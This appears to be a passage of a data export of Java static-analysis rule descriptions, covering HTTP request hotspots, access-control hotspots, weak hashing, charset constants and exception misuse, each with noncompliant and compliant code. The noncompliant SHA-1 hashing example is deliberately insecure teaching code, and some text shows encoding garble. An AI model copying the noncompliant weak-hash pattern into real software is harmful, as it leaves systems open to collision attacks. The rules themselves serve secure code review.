            ResponseHandler&lt;?&gt; responseHandler, HttpUriRequest uriRequest, HttpEntityEnclosingRequest eeRequest)
            throws Exception {
        HttpClient client = HttpClientBuilder.create().build();

        // All the following are Questionable
        client.execute(target, request);
        client.execute(target, request, context);
        client.execute(target, request, responseHandler);
        client.execute(target, request, responseHandler, context);
        client.execute(uriRequest);
        client.execute(uriRequest, context);
        client.execute(uriRequest, responseHandler);
        client.execute(uriRequest, responseHandler, context);
        con.sendRequestEntity(eeRequest);
        con.sendRequestHeader(request);
    }
}
</pre>
<pre>
// === google-http-java-client ===
import java.util.concurrent.Executor;
import com.google.api.client.http.GenericUrl;
import com.google.api.client.http.HttpRequest;
import com.google.api.client.http.HttpRequestFactory;
import com.google.api.client.http.javanet.NetHttpTransport;

class GoogleHttpClient {
    void foo(Executor executor) throws Exception {
        HttpRequestFactory requestFactory = new NetHttpTransport().createRequestFactory();
        HttpRequest request = requestFactory.buildGetRequest(new GenericUrl(""http://example.com""));

        // All the following are Questionable
        request.execute();
        request.executeAsync();
        request.executeAsync(executor);
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/400"">MITRE, CWE-400</a> - Uncontrolled Resource Consumption ('Resource Exhaustion') </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/200.html"">MITRE, CWE-200</a> - Information Exposure </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
</ul>",squid:S4825,java,Java,"<p>Sending HTTP requests is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8150"">CVE-2014-8150</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000007"">CVE-2018-1000007</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0660"">CVE-2010-0660</a> </li>
</ul>
<p>An HTTP request has different kinds of vulnerabilities:</p>
<ul>
  <li> it sends data which might be intercepted or dangerous. </li>
  <li> it receives a response which might have been crafted by an attacker. </li>
  <li> as each request opens a socket and triggers some processing for the sender and the recipient, it is possible to exhaust resources on both sides
  by sending too many requests. </li>
</ul>
<p>This rule flags code that initiates an HTTP request. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the http connection is encrypted or not. </li>
  <li> the recipient is not allowed to receive some of the data you send. </li>
  <li> the data sent might be dangerous (example: it contains unvalidated user input). </li>
  <li> an uncontrolled number of requests might be sent. For example, a request might be sent every time a user performs an action, and this action is
  not limited. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> First, it is important to encrypt all HTTP connection if there is any chance for them to be eavesdropped. Use HTTPS whenever possible. </li>
  <li> Ensure that you control the URIs you send requests to and the number or requests you send. Your software could otherwise be used to attack
  other services. </li>
  <li> Avoid sending sensitive information, be it in the URL, header or body. If part of the data comes from an untrusted source, such as a user
  input, sanitize it beforehand. </li>
  <li> Validate and sanitize the response before using it in any way. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
// === Java URL connection ===
import java.net.URL;
import java.net.HttpURLConnection;

abstract class URLConnection {
    void foo() throws Exception {
        URL url = new URL(""http://example.com"");
        HttpURLConnection con = (HttpURLConnection) url.openConnection(); // Questionable: review how the http connection is used

        doSomething((HttpURLConnection) url.openConnection()); // Questionable: review how the http connection is used
    }

    abstract void doSomething(HttpURLConnection httpUrlConnection);
}
</pre>
<pre>
// === HttpClient Java 9 ===
import jdk.incubator.http.HttpClient;
import jdk.incubator.http.HttpRequest;
import jdk.incubator.http.HttpResponse;

class JavaNet9 {
    void foo(HttpRequest request, HttpResponse.BodyHandler&lt;Object&gt; responseBodyHandler, HttpResponse.MultiProcessor&lt;?,?&gt; multiProcessor) throws Exception {
        HttpClient client = HttpClient.newHttpClient();
        client.send(request, responseBodyHandler); // Questionable
        client.sendAsync(request, responseBodyHandler); // Questionable
        client.sendAsync(request, multiProcessor); // Questionable
    }
}
</pre>
<pre>
// === HttpClient Java 10 ===
import jdk.incubator.http.HttpClient;
import jdk.incubator.http.HttpRequest;
import jdk.incubator.http.HttpResponse;

class JavaNet10 {
    void foo(HttpRequest request, HttpResponse.BodyHandler&lt;Object&gt; responseBodyHandler, HttpResponse.MultiSubscriber&lt;?,?&gt; multiSubscriber) throws Exception {
        HttpClient client = HttpClient.newHttpClient();
        client.send(request, responseBodyHandler); // Questionable
        client.sendAsync(request, responseBodyHandler); // Questionable
        client.sendAsync(request, multiSubscriber); // Questionable
    }
}
</pre>
<pre>
// === HttpClient Java 11 ===
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;

class JavaNet11 {
    void foo(HttpRequest request, HttpResponse.BodyHandler&lt;Object&gt; responseBodyHandler, HttpResponse.PushPromiseHandler&lt;Object&gt; pushPromiseHandler) throws Exception {
        HttpClient client = HttpClient.newHttpClient();
        client.send(request, responseBodyHandler); // Questionable
        client.sendAsync(request, responseBodyHandler); // Questionable
        client.sendAsync(request, responseBodyHandler, pushPromiseHandler); // Questionable
    }
}
</pre>
<pre>
// === apache ===
import org.apache.http.client.HttpClient;
import org.apache.http.client.ResponseHandler;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.HttpClientConnection;
import org.apache.http.HttpEntityEnclosingRequest;
import org.apache.http.HttpHost;
import org.apache.http.HttpRequest;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.protocol.HttpContext;

class ApacheHttpClient {
    void foo(HttpClientConnection con, HttpHost target, HttpRequest request, HttpContext context,
            ResponseHandler&lt;?&gt; responseHandler, HttpUriRequest uriRequest, HttpEntityEnclosingRequest eeRequest)
            throws Exception {
        HttpClient client = HttpClientBuilder.create().build();

        // All the following are Questionable
        client.execute(target, request);
        client.execute(target, request, context);
        client.execute(target, request, responseHandler);
        client.execute(target, request, responseHandler, context);
        client.execute(uriRequest);
        client.execute(uriRequest, context);
        client.execute(uriRequest, responseHandler);
        client.execute(uriRequest, responseHandler, context);
        con.sendRequestEntity(eeRequest);
        con.sendRequestHeader(request);
    }
}
</pre>
<pre>
// === google-http-java-client ===
import java.util.concurrent.Executor;
import com.google.api.client.http.GenericUrl;
import com.google.api.client.http.HttpRequest;
import com.google.api.client.http.HttpRequestFactory;
import com.google.api.client.http.javanet.NetHttpTransport;

class GoogleHttpClient {
    void foo(Executor executor) throws Exception {
        HttpRequestFactory requestFactory = new NetHttpTransport().createRequestFactory();
        HttpRequest request = requestFactory.buildGetRequest(new GenericUrl(""http://example.com""));

        // All the following are Questionable
        request.execute();
        request.executeAsync();
        request.executeAsync(executor);
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/400"">MITRE, CWE-400</a> - Uncontrolled Resource Consumption ('Resource Exhaustion') </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/200.html"">MITRE, CWE-200</a> - Information Exposure </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
</ul>",Sending HTTP requests is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a1', 'owasp-a3']",SECURITY_HOTSPOT
2017-06-02T13:36:45+0200,"<p>Creating a new <code>Throwable</code> without actually throwing it is useless and is probably due to a mistake.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x &lt; 0)
  new IllegalArgumentException(""x must be nonnegative"");
</pre>
<h2>Compliant Solution</h2>
<pre>
if (x &lt; 0)
  throw new IllegalArgumentException(""x must be nonnegative"");
</pre>",squid:S3984,java,Java,"<p>Creating a new <code>Throwable</code> without actually throwing it is useless and is probably due to a mistake.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x &lt; 0)
  new IllegalArgumentException(""x must be nonnegative"");
</pre>
<h2>Compliant Solution</h2>
<pre>
if (x &lt; 0)
  throw new IllegalArgumentException(""x must be nonnegative"");
</pre>",Exception should not be created without being thrown,[],MAJOR,['error-handling'],BUG
2018-11-12T11:11:26+0100,"<p>This rule raises an issue when an iteration over the items of a <code>Collection</code> is performed on a super-type of the type handled by the
<code>Collection</code>.</p>
<p>Relying on <code>Object</code> or any classes between <code>Object</code> and the real class handled by the <code>Collection</code> is not
recommended. While it's accepted by the language, this practice reduces readability of the code and forces to down-cast the item of the
<code>Collection</code> to be able to call a method on it while simply using the correct type in the iteration makes things more clear and simple.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public Collection&lt;Person&gt; getPersons() { ... }

for (Object item : getPersons()) { // Noncompliant
  Person person = (Person) item; // Noncompliant; it's required to down-cast to the to correct type to use ""item""
  person.getAdress();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (Person person : getPersons()) { // Compliant
  person.getAddress() ;
}
</pre>",squid:S4838,java,Java,"<p>This rule raises an issue when an iteration over the items of a <code>Collection</code> is performed on a super-type of the type handled by the
<code>Collection</code>.</p>
<p>Relying on <code>Object</code> or any classes between <code>Object</code> and the real class handled by the <code>Collection</code> is not
recommended. While it's accepted by the language, this practice reduces readability of the code and forces to down-cast the item of the
<code>Collection</code> to be able to call a method on it while simply using the correct type in the iteration makes things more clear and simple.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public Collection&lt;Person&gt; getPersons() { ... }

for (Object item : getPersons()) { // Noncompliant
  Person person = (Person) item; // Noncompliant; it's required to down-cast to the to correct type to use ""item""
  person.getAdress();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (Person person : getPersons()) { // Compliant
  person.getAddress() ;
}
</pre>",An iteration on a Collection should be performed on the type handled by the Collection,[],MINOR,"['bad-practice', 'clumsy']",CODE_SMELL
2018-11-12T11:11:26+0100,"<p>JDK7 introduced the class <code>java.nio.charset.StandardCharsets</code>. It provides constants for all charsets that are guaranteed to be
available on every implementation of the Java platform.</p>
<ul>
  <li> ISO_8859_1 </li>
  <li> US_ASCII </li>
  <li> UTF_16 </li>
  <li> UTF_16BE </li>
  <li> UTF_16LE </li>
  <li> UTF_8 </li>
</ul>
<p>These constants should be preferred to:</p>
<p>- the use of a String such as ""UTF-8"" which has the drawback of requiring the <code>catch</code>/<code>throw</code> of an
<code>UnsupportedEncodingException</code> that will never actually happen</p>
<p>- the use of GuavaÃ¢â‚¬â„¢s <code>Charsets</code> class, which has been obsolete since JDK7</p>
<h2>Noncompliant Code Example</h2>
<pre>
try {
  byte[] bytes = string.getBytes(""UTF-8""); // Noncompliant; use a String instead of StandardCharsets.UTF_8
} catch (UnsupportedEncodingException e) {
  throw new AssertionError(e);
}
// ...
byte[] bytes = string.getBytes(Charsets.UTF_8); // Noncompliant; Guava way obsolete since JDK7
</pre>
<h2>Compliant Solution</h2>
<pre>
byte[] bytes = string.getBytes(StandardCharsets.UTF_8)
</pre>",squid:S4719,java,Java,"<p>JDK7 introduced the class <code>java.nio.charset.StandardCharsets</code>. It provides constants for all charsets that are guaranteed to be
available on every implementation of the Java platform.</p>
<ul>
  <li> ISO_8859_1 </li>
  <li> US_ASCII </li>
  <li> UTF_16 </li>
  <li> UTF_16BE </li>
  <li> UTF_16LE </li>
  <li> UTF_8 </li>
</ul>
<p>These constants should be preferred to:</p>
<p>- the use of a String such as ""UTF-8"" which has the drawback of requiring the <code>catch</code>/<code>throw</code> of an
<code>UnsupportedEncodingException</code> that will never actually happen</p>
<p>- the use of GuavaÃ¢â‚¬â„¢s <code>Charsets</code> class, which has been obsolete since JDK7</p>
<h2>Noncompliant Code Example</h2>
<pre>
try {
  byte[] bytes = string.getBytes(""UTF-8""); // Noncompliant; use a String instead of StandardCharsets.UTF_8
} catch (UnsupportedEncodingException e) {
  throw new AssertionError(e);
}
// ...
byte[] bytes = string.getBytes(Charsets.UTF_8); // Noncompliant; Guava way obsolete since JDK7
</pre>
<h2>Compliant Solution</h2>
<pre>
byte[] bytes = string.getBytes(StandardCharsets.UTF_8)
</pre>","""StandardCharsets"" constants should be preferred",[],MINOR,"['clumsy', 'java7']",CODE_SMELL
2018-11-12T11:11:26+0100,"<p>Controlling permissions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12999"">CVE-2018-12999</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10285"">CVE-2018-10285</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7455"">CVE-2017-7455</a> </li>
</ul>
<p>Attackers can only damage what they have access to. Thus limiting their access is a good way to prevent them from wreaking havoc, but it has to be
done properly.</p>
<p>This rule flags code that controls the access to resources and actions. The goal is to guide security code reviews.</p>
<p>More specifically it will raise issues on the following Spring code:</p>
<ul>
  <li> The definition of any class implementing interfaces </li>
</ul>
<p> <strong></strong> <code>org.springframework.security.access.AccessDecisionVoter</code></p>
<p> <strong></strong> <code>org.springframework.security.access.AccessDecisionManager</code></p>
<p> <strong></strong> <code>org.springframework.security.access.AfterInvocationProvider</code></p>
<p> <strong></strong> <code>org.springframework.security.access.PermissionEvaluator</code></p>
<p> <strong></strong> <code>org.springframework.security.access.expression.SecurityExpressionOperations</code></p>
<p> <strong></strong> <code>org.springframework.security.access.expression.method.MethodSecurityExpressionHandler</code></p>
<p> <strong></strong> <code>org.springframework.security.core.GrantedAuthority</code></p>
<p> <strong></strong> <code>org.springframework.security.acls.model.PermissionGrantingStrategy</code></p>
<ul>
  <li> The definition of any class extending class </li>
</ul>
<p> <strong></strong> <code>org.springframework.security.config.annotation.method.configuration.GlobalMethodSecurityConfiguration</code></p>
<ul>
  <li> Any method annotated with </li>
</ul>
<p> <strong></strong> Pre-post annotations: <code>@PreAuthorize</code>, <code>@PreFilter</code>, <code>@PostAuthorize</code> or
<code>@PostFilter</code> from <code>org.springframework.security.access.prepost</code> package.</p>
<p> <strong></strong> <code>@org.springframework.security.access.annotation.Secured</code></p>
<ul>
  <li> Calls to any of the following methods </li>
</ul>
<p> <strong></strong> <code>org.springframework.security.acls.model.MutableAclService</code>: <code>createAcl</code>, <code>deleteAcl</code>,
<code>updateAcl</code></p>
<p> <strong></strong> <code>org.springframework.security.config.annotation.web.builders.HttpSecurity</code>: <code>authorizeRequests</code></p>
<ul>
  <li> The instantiation of an anonymous class implementing <code>org.springframework.security.core.GrantedAuthority</code> or of any class
  implementing this interface directly. </li>
</ul>
<p>It will also raise issue on JSR-250 annotations <code>@RolesAllowed</code>, <code>@PermitAll</code> and <code>@DenyAll</code> from
<code>javax.annotation.security</code> package.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> at least one accessed action or resource is security-sensitive. </li>
  <li> there is no access control in place or it does not cover all sensitive actions and resources. </li>
  <li> users have permissions they don't need. </li>
  <li> the access control is based on a user input or on some other unsafe data. </li>
  <li> permissions are difficult to remove or take a long time to be updated. </li>
</ul>
<p>You are at risk if you answered yes to the first question and any of the following ones.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The first step is to restrict all sensitive actions to authenticated users.</p>
<p>Each user should have the lowest privileges possible. The access control granularity should match the sensitivity of each resource or action. The
more sensitive it is, the less people should have access to it. </p>
<p>Do not base the access control on a user input or on a value which might have been tampered with. For example, the developer should not read a
user's permissions from an HTTP cookie as it can be modified client-side.</p>
<p>Check that the access to each action and resource is properly restricted.</p>
<p>Enable administrators to swiftly remove permissions when necessary. This enables them to reduce the time an attacker can have access to your
systems when a breach occurs.</p>
<p>Log and monitor refused access requests as they can reveal an attack.</p>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A5 - Broken Access Control </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",squid:S4834,java,Java,"<p>Controlling permissions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12999"">CVE-2018-12999</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10285"">CVE-2018-10285</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7455"">CVE-2017-7455</a> </li>
</ul>
<p>Attackers can only damage what they have access to. Thus limiting their access is a good way to prevent them from wreaking havoc, but it has to be
done properly.</p>
<p>This rule flags code that controls the access to resources and actions. The goal is to guide security code reviews.</p>
<p>More specifically it will raise issues on the following Spring code:</p>
<ul>
  <li> The definition of any class implementing interfaces </li>
</ul>
<p> <strong></strong> <code>org.springframework.security.access.AccessDecisionVoter</code></p>
<p> <strong></strong> <code>org.springframework.security.access.AccessDecisionManager</code></p>
<p> <strong></strong> <code>org.springframework.security.access.AfterInvocationProvider</code></p>
<p> <strong></strong> <code>org.springframework.security.access.PermissionEvaluator</code></p>
<p> <strong></strong> <code>org.springframework.security.access.expression.SecurityExpressionOperations</code></p>
<p> <strong></strong> <code>org.springframework.security.access.expression.method.MethodSecurityExpressionHandler</code></p>
<p> <strong></strong> <code>org.springframework.security.core.GrantedAuthority</code></p>
<p> <strong></strong> <code>org.springframework.security.acls.model.PermissionGrantingStrategy</code></p>
<ul>
  <li> The definition of any class extending class </li>
</ul>
<p> <strong></strong> <code>org.springframework.security.config.annotation.method.configuration.GlobalMethodSecurityConfiguration</code></p>
<ul>
  <li> Any method annotated with </li>
</ul>
<p> <strong></strong> Pre-post annotations: <code>@PreAuthorize</code>, <code>@PreFilter</code>, <code>@PostAuthorize</code> or
<code>@PostFilter</code> from <code>org.springframework.security.access.prepost</code> package.</p>
<p> <strong></strong> <code>@org.springframework.security.access.annotation.Secured</code></p>
<ul>
  <li> Calls to any of the following methods </li>
</ul>
<p> <strong></strong> <code>org.springframework.security.acls.model.MutableAclService</code>: <code>createAcl</code>, <code>deleteAcl</code>,
<code>updateAcl</code></p>
<p> <strong></strong> <code>org.springframework.security.config.annotation.web.builders.HttpSecurity</code>: <code>authorizeRequests</code></p>
<ul>
  <li> The instantiation of an anonymous class implementing <code>org.springframework.security.core.GrantedAuthority</code> or of any class
  implementing this interface directly. </li>
</ul>
<p>It will also raise issue on JSR-250 annotations <code>@RolesAllowed</code>, <code>@PermitAll</code> and <code>@DenyAll</code> from
<code>javax.annotation.security</code> package.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> at least one accessed action or resource is security-sensitive. </li>
  <li> there is no access control in place or it does not cover all sensitive actions and resources. </li>
  <li> users have permissions they don't need. </li>
  <li> the access control is based on a user input or on some other unsafe data. </li>
  <li> permissions are difficult to remove or take a long time to be updated. </li>
</ul>
<p>You are at risk if you answered yes to the first question and any of the following ones.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The first step is to restrict all sensitive actions to authenticated users.</p>
<p>Each user should have the lowest privileges possible. The access control granularity should match the sensitivity of each resource or action. The
more sensitive it is, the less people should have access to it. </p>
<p>Do not base the access control on a user input or on a value which might have been tampered with. For example, the developer should not read a
user's permissions from an HTTP cookie as it can be modified client-side.</p>
<p>Check that the access to each action and resource is properly restricted.</p>
<p>Enable administrators to swiftly remove permissions when necessary. This enables them to reduce the time an attacker can have access to your
systems when a breach occurs.</p>
<p>Log and monitor refused access requests as they can reveal an attack.</p>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A5 - Broken Access Control </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",Controlling permissions is security-sensitive,[],CRITICAL,"['owasp-a5', 'sans-top25-porous']",SECURITY_HOTSPOT
2018-11-12T11:11:26+0100,"<p>Using the standard <code>getClassLoader()</code> may not return the <em>right</em> class loader in a JEE context. Instead, go through the
<code>currentThread</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
ClassLoader cl = this.getClass().getClassLoader();  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
ClassLoader cl = Thread.currentThread().getContextClassLoader();
</pre>",squid:S3032,java,Java,"<p>Using the standard <code>getClassLoader()</code> may not return the <em>right</em> class loader in a JEE context. Instead, go through the
<code>currentThread</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
ClassLoader cl = this.getClass().getClassLoader();  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
ClassLoader cl = Thread.currentThread().getContextClassLoader();
</pre>","JEE applications should not ""getClassLoader""",[],MINOR,['jee'],BUG
2015-01-05T09:08:32+0100,"<p>The MD5 algorithm and its successor, SHA-1, are no longer considered secure, because it is too easy to create hash collisions with them. That is,
it takes too little computational effort to come up with a different input that produces the same MD5 or SHA-1 hash, and using the new, same-hash
value gives an attacker the same access as if he had the originally-hashed value. This applies as well to the other Message-Digest algorithms: MD2,
MD4, MD6, HAVAL-128, HMAC-MD5, DSA (which uses SHA-1), RIPEMD, RIPEMD-128, RIPEMD-160, HMACRIPEMD160.</p>
<p>The following APIs are tracked for use of obsolete crypto algorithms:</p>
<p> * <code>java.security.AlgorithmParameters</code> (JDK)</p>
<p> * <code>java.security.AlgorithmParameterGenerator</code> (JDK)</p>
<p> * <code>java.security.MessageDigest</code> (JDK)</p>
<p> * <code>java.security.KeyFactory</code> (JDK)</p>
<p> * <code>java.security.KeyPairGenerator</code> (JDK)</p>
<p> * <code>java.security.Signature</code> (JDK)</p>
<p> * <code>javax.crypto.Mac</code> (JDK)</p>
<p> * <code>javax.crypto.KeyGenerator</code> (JDK)</p>
<p> * <code>org.apache.commons.codec.digest.DigestUtils</code> (Apache Commons Codec)</p>
<p> * <code>com.google.common.hash.Hashing</code> (Guava)</p>
<p> * <code>org.springframework.security.authentication.encoding.ShaPasswordEncoder</code> (Spring Security 4.2.x)</p>
<p> * <code>org.springframework.security.authentication.encoding.Md5PasswordEncoder</code> (Spring Security 4.2.x)</p>
<p> * <code>org.springframework.security.crypto.password.LdapShaPasswordEncoder</code> (Spring Security 5.0.x)</p>
<p> * <code>org.springframework.security.crypto.password.Md4PasswordEncoder</code> (Spring Security 5.0.x)</p>
<p> * <code>org.springframework.security.crypto.password.MessageDigestPasswordEncoder</code> (Spring Security 5.0.x)</p>
<p> * <code>org.springframework.security.crypto.password.NoOpPasswordEncoder</code> (Spring Security 5.0.x)</p>
<p> * <code>org.springframework.security.crypto.password.StandardPasswordEncoder</code> (Spring Security 5.0.x)</p>
<p>Consider using safer alternatives, such as SHA-256, SHA-3 or adaptive one way functions like bcrypt or PBKDF2.</p>
<h2>Noncompliant Code Example</h2>
<pre>
MessageDigest md = MessageDigest.getInstance(""SHA1"");  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
MessageDigest md = MessageDigest.getInstance(""SHA-256"");
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/328"">MITRE, CWE-328</a> - Reversible One-Way Hash </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/327"">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> OWASP Top 10 2017 Category A6 - Security Misconfiguration </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
  <li> <a href=""http://shattered.io/"">SHAttered</a> - The first concrete collision attack against SHA-1. </li>
</ul>",squid:S2070,java,Java,"<p>The MD5 algorithm and its successor, SHA-1, are no longer considered secure, because it is too easy to create hash collisions with them. That is,
it takes too little computational effort to come up with a different input that produces the same MD5 or SHA-1 hash, and using the new, same-hash
value gives an attacker the same access as if he had the originally-hashed value. This applies as well to the other Message-Digest algorithms: MD2,
MD4, MD6, HAVAL-128, HMAC-MD5, DSA (which uses SHA-1), RIPEMD, RIPEMD-128, RIPEMD-160, HMACRIPEMD160.</p>
<p>The following APIs are tracked for use of obsolete crypto algorithms:</p>
<p> * <code>java.security.AlgorithmParameters</code> (JDK)</p>
<p> * <code>java.security.AlgorithmParameterGenerator</code> (JDK)</p>
<p> * <code>java.security.MessageDigest</code> (JDK)</p>
<p> * <code>java.security.KeyFactory</code> (JDK)</p>
<p> * <code>java.security.KeyPairGenerator</code> (JDK)</p>
<p> * <code>java.security.Signature</code> (JDK)</p>
<p> * <code>javax.crypto.Mac</code> (JDK)</p>
<p> * <code>javax.crypto.KeyGenerator</code> (JDK)</p>
<p> * <code>org.apache.commons.codec.digest.DigestUtils</code> (Apache Commons Codec)</p>
<p> * <code>com.google.common.hash.Hashing</code> (Guava)</p>
<p> * <code>org.springframework.security.authentication.encoding.ShaPasswordEncoder</code> (Spring Security 4.2.x)</p>
<p> * <code>org.springframework.security.authentication.encoding.Md5PasswordEncoder</code> (Spring Security 4.2.x)</p>
<p> * <code>org.springframework.security.crypto.password.LdapShaPasswordEncoder</code> (Spring Security 5.0.x)</p>
<p> * <code>org.springframework.security.crypto.password.Md4PasswordEncoder</code> (Spring Security 5.0.x)</p>
<p> * <code>org.springframework.security.crypto.password.MessageDigestPasswordEncoder</code> (Spring Security 5.0.x)</p>
<p> * <code>org.springframework.security.crypto.password.NoOpPasswordEncoder</code> (Spring Security 5.0.x)</p>
<p> * <code>org.springframework.security.crypto.password.StandardPasswordEncoder</code> (Spring Security 5.0.x)</p>
<p>Consider using safer alternatives, such as SHA-256, SHA-3 or adaptive one way functions like bcrypt or PBKDF2.</p>
<h2>Noncompliant Code Example</h2>
<pre>
MessageDigest md = MessageDigest.getInstance(""SHA1"");  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
MessageDigest md = MessageDigest.getInstance(""SHA-256"");
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/328"">MITRE, CWE-328</a> - Reversible One-Way Hash </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/327"">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> OWASP Top 10 2017 Category A6 - Security Misconfiguration </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
  <li> <a href=""http://shattered.io/"">SHAttered</a> - The first concrete collision attack against SHA-1. </li>
</ul>",SHA-1 and Message-Digest hash algorithms should not be used in secure contexts,[],CRITICAL,"['cwe', 'owasp-a6', 'sans-top25-porous', 'spring']",VULNERABILITY
2015-02-17T07:18:47+0100,"<p>Clear, communicative naming is important in code. It helps maintainers and API users understand the intentions for and uses of a unit of code.
Using ""exception"" in the name of a class that does not extend <code>Exception</code> or one of its subclasses is a clear violation of the expectation
that a class' name will indicate what it is and/or does.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class FruitException {  // Noncompliant; this has nothing to do with Exception
  private Fruit expected;
  private String unusualCharacteristics;
  private boolean appropriateForCommercialExploitation;
  // ...
}

public class CarException {  // Noncompliant; the extends clause was forgotten?
  public CarException(String message, Throwable cause) {
  // ...
</pre>
<h2>Compliant Solution</h2>
<pre>
public class FruitSport {
  private Fruit expected;
  private String unusualCharacteristics;
  private boolean appropriateForCommercialExploitation;
  // ...
}

public class CarException extends Exception {
  public CarException(String message, Throwable cause) {
  // ...
</pre>",squid:S2166,java,Java,"<p>Clear, communicative naming is important in code. It helps maintainers and API users understand the intentions for and uses of a unit of code.
Using ""exception"" in the name of a class that does not extend <code>Exception</code> or one of its subclasses is a clear violation of the expectation
that a class' name will indicate what it is and/or does.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class FruitException {  // Noncompliant; this has nothing to do with Exception
  private Fruit expected;
  private String unusualCharacteristics;
  private boolean appropriateForCommercialExploitation;
  // ...
}

public class CarException {  // Noncompliant; the extends clause was forgotten?
  public CarException(String message, Throwable cause) {
  // ...
</pre>
<h2>Compliant Solution</h2>
<pre>
public class FruitSport {
  private Fruit expected;
  private String unusualCharacteristics;
  private boolean appropriateForCommercialExploitation;
  // ...
}

public class CarException extends Exception {
  public CarException(String message, Throwable cause) {
  // ...
</pre>","Classes named like ""Exception"" should extend ""Exception"" or a subclass",[],MAJOR,"['convention', 'error-handling', 'pitfall']",CODE_SMELL
2018-11-12T11:11:26+0100,"<p>There is little valid reason to use the methods of the <code>ThreadGroup</code> class. Some are deprecated (<code>allowThreadSuspension()</code>,
<code>resume()</code>, <code>stop()</code>, and <code>suspend()</code>), some are obsolete, others aren't thread-safe, and still others are insecure
(<code>activeCount()</code>, <code>enumerate()</code>) . For these reasons, any use of <code>ThreadGroup</code> is suspicious and should be
avoided.</p>
<h2>Compliant Solution</h2>
<pre>
ThreadFactory threadFactory = Executors.defaultThreadFactory();
ThreadPoolExecutor executorPool = new ThreadPoolExecutor(3, 10, 5, TimeUnit.SECONDS, new ArrayBlockingQueue&lt;Runnable&gt;(2), threadFactory);

for (int i = 0; i &lt; 10; i++) {
  executorPool.execute(new JobThread(""Job: "" + i));
}

System.out.println(executorPool.getActiveCount()); // Compliant
executorPool.shutdown();
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/RQCHAQ"">CERT, THI01-J.</a> - Do not invoke ThreadGroup methods </li>
</ul>",squid:S3014,java,Java,"<p>There is little valid reason to use the methods of the <code>ThreadGroup</code> class. Some are deprecated (<code>allowThreadSuspension()</code>,
<code>resume()</code>, <code>stop()</code>, and <code>suspend()</code>), some are obsolete, others aren't thread-safe, and still others are insecure
(<code>activeCount()</code>, <code>enumerate()</code>) . For these reasons, any use of <code>ThreadGroup</code> is suspicious and should be
